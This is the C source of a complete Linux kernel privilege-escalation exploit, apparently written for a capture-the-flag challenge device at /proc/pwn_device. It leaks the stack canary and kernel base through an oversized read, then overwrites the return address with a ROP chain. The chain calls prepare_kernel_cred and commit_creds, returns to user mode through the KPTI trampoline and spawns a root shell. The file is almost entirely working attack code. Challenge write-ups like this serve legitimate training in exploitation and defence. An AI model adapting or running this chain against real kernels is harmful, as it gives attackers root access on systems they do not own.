#include <stddef.h>
#include <stdlib.h>

#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define IOCTL_DEBUG 0x10
#define IOCTL_SET_MAX_BUFFER 0x20
#define RAW_IMAGE_BASE 0xffffffff81000000

#define prepare_kernel_cred (image_base + 0x0881c0)
#define commit_creds (image_base + 0x087e80)
#define kpti_trampoline (image_base + 0xc00a2f)
#define pop_rdi (0xffffffff81001518 + offset)

int global_fd;

size_t user_cs, user_rflags, user_sp, user_ss;
size_t cookie, image_base, offset;
size_t tmp_buf, cred_struct;

enum current_state {
    create_cred_struct_state,
    spawn_shell_state,
} global_cstate;

void _swrite(void *buf, size_t sz) {
    ssize_t nb = write(global_fd, buf, sz);
    if (nb < 0) {
        puts("[!] Failed to write to device");
        exit(EXIT_FAILURE);
    }
    printf("[*] Wrote 0x%zx bytes\n", nb);
}

void _sread(void *buf, size_t sz) {
    ssize_t nb = read(global_fd, buf, sz);
    if (nb < 0) {
        puts("[!] Failed to read from device");
        exit(EXIT_FAILURE);
    }
    printf("[*] Read 0x%zx bytes\n", nb);
}

void _sioctl(size_t cmd, size_t arg) {
    ioctl(global_fd, cmd, arg);
}

void open_dev(void) {
    global_fd = open("/proc/pwn_device", O_RDWR);
    if (global_fd < 0) {
        puts("[!] Failed to open device");
        exit(EXIT_FAILURE);
    }
    puts("[*] Device opened");
}

void spawn_shell(void) {
    uid_t uid = geteuid();
    if (uid > 0) {
        printf("[!] Failed to get root uid (uid = %d)\n", uid);
        exit(EXIT_FAILURE);
    }
    puts("[*] Spawning shell as root uid");
    system("/bin/sh");
}

void privesc(void);

void safe_exit(void) {
    __asm__(".intel_syntax noprefix;"
            "mov tmp_buf, rax;"
            ".att_syntax noprefix;");
    if (global_cstate == create_cred_struct_state) {
        cred_struct = tmp_buf;
        printf("[*] cred_struct @ 0x%zx\n", cred_struct);
        global_cstate = spawn_shell_state;
        privesc();
        return;
    }
    spawn_shell();
}

void privesc(void) {
    size_t payload[0x200 / 8];
    size_t cookie_idx = 0x80 / 8;

    payload[cookie_idx++] = cookie;
    payload[cookie_idx++] = 0; // rbx

    if (global_cstate == create_cred_struct_state) {
        payload[cookie_idx++] = pop_rdi; // saved rip
        payload[cookie_idx++] = 0;
        payload[cookie_idx++] = prepare_kernel_cred;
    } else if (global_cstate == spawn_shell_state) {
        payload[cookie_idx++] = pop_rdi; // saved_rip
        payload[cookie_idx++] = cred_struct;
        payload[cookie_idx++] = commit_creds;
    }
    payload[cookie_idx++] = kpti_trampoline + 22;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = (size_t)safe_exit;
    payload[cookie_idx++] = user_cs;
    payload[cookie_idx++] = user_rflags;
    payload[cookie_idx++] = user_sp;
    payload[cookie_idx++] = user_ss;

    puts("[*] Sending payload");
    _swrite(payload, sizeof(payload));
}

void save_user_state(void) {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_sp, rsp;"
            "mov user_ss, ss;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
}

int main(void) {
    save_user_state();
    puts("[*] User state saved");

    open_dev();

    // swrite writes to [saved_rip-0x90]
    int max_buffer = 0x300;
    printf("[*] Setting MaxBuffer to 0x%x\n", max_buffer);
    _sioctl(IOCTL_SET_MAX_BUFFER, max_buffer);

    // sread canary is on [saved_rip-0x10] or [local_buf+0x80]
    // local_buf is on [saved_rip-0x90]
    size_t leak[0x100 / 8];
    _sread(leak, sizeof(leak));
    cookie = leak[0x80 / 8];
    printf("[*] cookie = %zx\n", cookie);

    image_base = leak[18] - 0x23e347;
    offset = image_base - RAW_IMAGE_BASE;
    printf("[*] image base @ 0x%zx\n", image_base);

    global_cstate = create_cred_struct_state;
    privesc();
    return 0;
}
